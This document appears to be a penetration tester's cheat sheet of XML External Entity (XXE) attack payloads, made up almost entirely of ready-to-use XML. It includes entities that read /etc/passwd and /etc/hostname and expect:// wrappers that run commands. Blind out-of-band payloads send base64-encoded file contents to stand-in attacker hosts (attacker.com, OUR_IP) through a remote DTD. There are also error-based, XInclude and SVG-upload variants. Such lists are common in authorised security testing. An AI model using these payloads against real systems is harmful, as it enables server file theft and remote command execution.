XXE File Read
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
XXE File Read PHP Wrappers
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
RCE PHP Wrappers
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "expect://id"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### DTD Blind XXE
OAST detection
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
```
OAST detection parameter entities
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE product [ 
<!ENTITY % xxe SYSTEM "http://attacker.com/"> 
%xxe;]>
```
(PHP) OAST File Read (xxe.dtd)
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://attacker.com/?content=%file;'>">
```
OAST File Read payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<stockCheck><productId>&content;</productId></stockCheck>
```
OAST File Read parameter entity
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; content SYSTEM 'http://attacker.com/?content=%file;'>">
```
OAST File Read payload parameter entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
  %content;
]>
```
OAST Error File Read (xxe dtd)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; 
%error;
```
### XInclude
Payload for file read, found server-side XML parsing
```XML
<foo+xmlns:xi="http://www.w3.org/2001/XInclude">+<xi:include+parse="text"+href="file:///etc/passwd"/></foo>
```
### SVG XXE
Xinclude
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```
XML
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">
		&xxe;
	</text>
</svg>
```
OAST XML
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">
		&xxe;
	</text>
</svg>
```